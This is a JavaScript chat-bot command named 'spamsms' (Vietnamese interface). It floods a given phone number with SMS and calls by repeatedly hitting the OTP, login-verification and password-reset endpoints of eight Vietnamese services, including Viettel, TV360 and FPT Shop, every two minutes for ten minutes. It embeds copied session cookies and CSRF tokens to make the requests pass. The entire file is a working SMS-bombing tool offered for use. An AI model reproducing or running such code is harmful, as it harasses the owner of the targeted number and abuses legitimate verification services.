const axios = require('axios');

module.exports = {
  name: "spamsms",
  usedby: 0,
  info: "gửi thông báo đến số",
  onPrefix: false,
  cooldowns: 10,

  onLaunch: function ({ api, event }) {
    const args = event.body.trim().split(" ");
    if (args.length < 2) {
      return api.sendMessage("Vui lòng nhập số điện thoại. Ví dụ: spamsms 0123456789", event.threadID, event.messageID);
    }

    const phone = args[1];
    const spamDuration = 10 * 60 * 1000; // 10 minutes in milliseconds
    const viettelCookies = {
      'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
      '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
      'redirectLogin': 'https://viettel.vn/dang-ky',
      'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    };

    const viettelHeaders = {
      'Connection': 'keep-alive',
      'Content-Type': 'application/json;charset=UTF-8',
      'Origin': 'https://viettel.vn',
      'Referer': 'https://viettel.vn/dang-ky',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
      'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
      'X-Requested-With': 'XMLHttpRequest',
      'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
      'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
    };

    const viettelData = {
      msisdn: phone,
    };

    const tv360Headers = {
      "Host": "m.tv360.vn",
      "Connection": "keep-alive",
      "Content-Length": "23",
      "Accept": "application/json, text/plain, */*",
      "User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36",
      "Content-Type": "application/json",
      "Origin": "http://m.tv360.vn",
      "Referer": "http://m.tv360.vn/login?r=http%3A%2F%2Fm.tv360.vn%2F",
      "Accept-Encoding": "gzip, deflate"
    };

    const tv360Data = {
      msisdn: phone
    };

    const kimungvayHeaders = {
  'Host': 'api.kimungvay.co',
  'Accept': 'application/json, text/plain, */*',
  'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
  'Content-Type': 'application/x-www-form-urlencoded',
  'Origin': 'https://h5.kimungvay.site',
  'Referer': 'https://h5.kimungvay.site/',
  'X-Requested-With': 'mark.via.gp',
  'Sec-Fetch-Site': 'cross-site',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Dest': 'empty',
  'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
};

    const kimungvayData = `phone=${phone}&type=2&ctype=1&chntoken=e51d233aa164cb9ec126578fc2d553f6`;

        const vivohanCookies = {
      'JSESSIONID': 'D15C9181DF236AE13B2AD4DFC7F826EB',
    };

    const vivohanHeaders = {
      'Host': 'h5.vivohan.com',
      'Connection': 'keep-alive',
      'system': 'android',
      'appcodename': 'Mozilla',
      'deviceType': 'h5',
      'screenresolution': '1080,1920',
      'appname': 'Netscape',
      'channel': 'e242',
      'w': '1080',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
      'Content-Language': 'vn',
      'Accept': 'application/json, text/plain, */*',
      'platform': 'Linux i686',
      'vendor': 'Google Inc.',
      'Content-Type': 'application/json;charset=UTF-8',
      'h': '1920',
      'appversion': '5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
      'Origin': 'https://h5.vivohan.com',
      'X-Requested-With': 'mark.via.gp',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'Referer': 'https://h5.vivohan.com/login',
      'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    };

    const vivohanData = {
      phone: phone,
      type: 2,
      timestamp: 1703951639000,
      referrer: 'utm_source=e242',
      af_prt: 'e242',
      sign: '0f656af82eb1da33221a06d1171db265',
      appversion: '1.0.0',
      channel: 1,
      app_version: '1.0.0',
      version: '1.0.0',
      imei: 'f30c673736f5301bd94aaaad5b543d90',
      uuid: 'f30c673736f5301bd94aaaad5b543d90',
      pkg_name: 'com.qcvivo.vivohanh5',
    };

        const itaphoaHeaders = {
      'authority': 'api.itaphoa.com',
      'accept': 'application/json',
      'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
      'dnt': '1',
      'origin': 'https://shop.mioapp.vn',
      'referer': 'https://shop.mioapp.vn/',
      'region-code': 'HCM',
      'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'cross-site',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    };

    const itaphoaParams = {
      phone: phone,
      type: 'call',
    };

        const kavayCookies = {
      'csrftoken': 'jxZ3X9GCAyb74yxGzBAEtd8Ke1TAXESU9qpypmmi6jAkrNC2lOo3vepbv5q29aU7',
      'tel': phone,
    };

    const kavayHeaders = {
      'Host': 'kavaycash.com',
      'Connection': 'keep-alive',
      'Cache-Control': 'max-age=0',
      'Upgrade-Insecure-Requests': '1',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'X-Requested-With': 'mark.via.gp',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-User': '?1',
      'Sec-Fetch-Dest': 'document',
      'Referer': 'https://kavaycash.com/',
      'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    };

        const vayVndCookies = {
      '_tt_enable_cookie': '1',
      '_ttp': 'UrWHpav-jlIIAkZIKfuHiWzvo3q',
      '_ym_uid': '1690890718761379945',
      '_ym_d': '1693615052',
      '_fbp': 'fb.1.1699102383332.1544435954',
      '_gcl_aw': 'GCL.1703856886.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE',
      '_gcl_au': '1.1.667368353.1703856886',
      '_ga_P2783EHVX2': 'GS1.1.1703856890.5.0.1703856890.60.0.0',
      '_ym_isad': '1',
      '_ga': 'GA1.2.1456721416.1693615049',
      '_gid': 'GA1.2.84320069.1703856892',
      '_gac_UA-151110385-1': '1.1703856892.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE',
      '_ym_visorc': 'w',
    };

    const vayVndHeaders = {
      'authority': 'api.vayvnd.vn',
      'accept': 'application/json',
      'accept-language': 'vi-VN',
      'content-type': 'application/json; charset=utf-8',
      'dnt': '1',
      'origin': 'https://vayvnd.vn',
      'referer': 'https://vayvnd.vn/',
      'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      'site-id': '3',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    };

    const vayVndData = {
      'login': phone,
      'trackingId': 'h9vBHoAE9KcJ7xX6GF8sfN7hHxryAIwl28zt6ycjTI8JhfdLlE1fHyGTqQmw8AMN',
    };

    const fptShopCookies = {
      'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc': '49eb18d9-d110-4043-8ad4-7275d8b8d2e7',
      '_gcl_au': '1.1.810434433.1689606249',
      'fpt_uuid': '%226a6dc316-0db3-44a0-8891-224623887942%22',
      'ajs_group_id': 'null',
      '_tt_enable_cookie': '1',
      '_ttp': '8uDshq4oYRcpPmQFUdKlNsoewGP',
      '__admUTMtime': '1689606251',
      '__uidac': '9d45aa00b705e4c9ff20708ca0955e4f',
      '__iid': '',
      '__su': '0',
      '_gid': 'GA1.3.1682465247.1691155413',
      '_gat': '1',
      '_ga': 'GA1.1.1211624965.1689606248',
      'vMobile': '1',
      '__zi': '3000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_yX0Iyz-rUpftKyLnd-SeEpVIXt1DvokvPf97yizcQtaDp0.1',
      'cf_clearance': 'm4Jw8L0YfcX1sOo1SwE_jMGACjNFcJ0fu_5BSusrDew-1691155422-0-1-386b1bcb.29faee9a.6f6a442b-0.2.1691155422',
      '_hjSessionUser_731679': 'eyJpZCI6ImIzZDQ0ZDBlLTFlMTUtNThhNS1iNzU1LWM5ODdjZmYzMTkxMyIsImNyZWF0ZWQiOjE2ODk2MDYyNTIyMTEsImV4aXN0aW5nIjp0cnVlfQ==',
      '_hjIncludedInSessionSample_731679': '0',
      '_hjSession_731679': 'eyJpZCI6ImJkOTcxOTVjLTM1Y2EtNDg1OC1hMDA1LTFmOWIxYzc3M2VjNiIsImNyZWF0ZWQiOjE2OTExNTU0MTg5NjksImluU2FtcGxlIjpmYWxzZX0=',
      '_ga_ZR815NQ85K': 'GS1.1.1691155413.2.0.1691155423.50.0.0',
    };

    const fptShopHeaders = {
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
      'Connection': 'keep-alive',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'DNT': '1',
      'Origin': 'https://fptshop.com.vn',
      'Referer': 'https://fptshop.com.vn/',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
      'X-Requested-With': 'XMLHttpRequest',
      'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
    };

    const fptShopData = new URLSearchParams();
    fptShopData.append('phone', phone);
    fptShopData.append('typeReset', '0');


    // Initial message to be edited later
    let messageID = null;
    let successCount = 0;
    let failureCount = 0;

    // Send initial message showing spam details
    const initialMessage = `SPAM SMS\nSố: ${phone}\nThời gian spam: 10 phút\nSố lần gửi thành công: ${successCount}\nSố lần gửi thất bại: ${failureCount}`;
    api.sendMessage(initialMessage, event.threadID, (error, messageInfo) => {
      if (!error) {
        messageID = messageInfo.messageID;
      }
    });

    // Function to send spam requests
    const sendSpamRequests = () => {
      // Send both requests in parallel
      Promise.all([
        axios.post('https://viettel.vn/api/get-otp', viettelData, {
          headers: viettelHeaders,
          withCredentials: true,
          cookies: viettelCookies,
        }),
        axios.post("http://m.tv360.vn/public/v1/auth/get-otp-login", tv360Data, {
          headers: tv360Headers
        }), 
        axios.post("https://api.kimungvay.co/h5/LoginMessage_ultimate", kimungvayData, {
          headers: kimungvayHeaders
        }), 
        axios.post("https://h5.vivohan.com/api/register/app/sendSms", vivohanData, {
          headers: vivohanHeaders,
          withCredentials: true,
          cookies: vivohanCookies,
        }), 
        axios.get('https://api.itaphoa.com/customer/send-gen-otp', {
          params: itaphoaParams,
          headers: itaphoaHeaders
        }), 
        axios.get('https://kavaycash.com/verification/', {
          headers: kavayHeaders,
          cookies: kavayCookies
        }), 
        axios.post('https://api.vayvnd.vn/v2/users/password-reset', vayVndData, { headers: vayVndHeaders, cookies: vayVndCookies }), 
        axios.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', fptShopData, { headers: fptShopHeaders, cookies: fptShopCookies })
      ])
      .then(() => {
        successCount += 8;
        updateMessage();
      })
      .catch(() => {
        failureCount += 8;
        updateMessage();
      });
    };

    // Function to update the message with success and failure count
    const updateMessage = () => {
      const updatedMessage = `SPAM SMS\nSố: ${phone}\nThời gian spam: 10 phút\nSố lần gửi thành công: ${successCount}\nSố lần gửi thất bại: ${failureCount}`;
      if (messageID) {
        api.editMessage(updatedMessage, event.threadID, messageID);
      }
    };

    // Send the spam requests every 120 seconds (120000 milliseconds)
    const interval = setInterval(sendSpamRequests, 120000);

    // Send the first spam request immediately
    sendSpamRequests();

    // Stop spamming after the specified duration
    setTimeout(() => {
      clearInterval(interval);
      api.sendMessage(`Đã dừng spam SMS cho số ${phone}. Số lần gửi thành công: ${successCount}, thất bại: ${failureCount}`, event.threadID, event.messageID);
    }, spamDuration);
  }
};
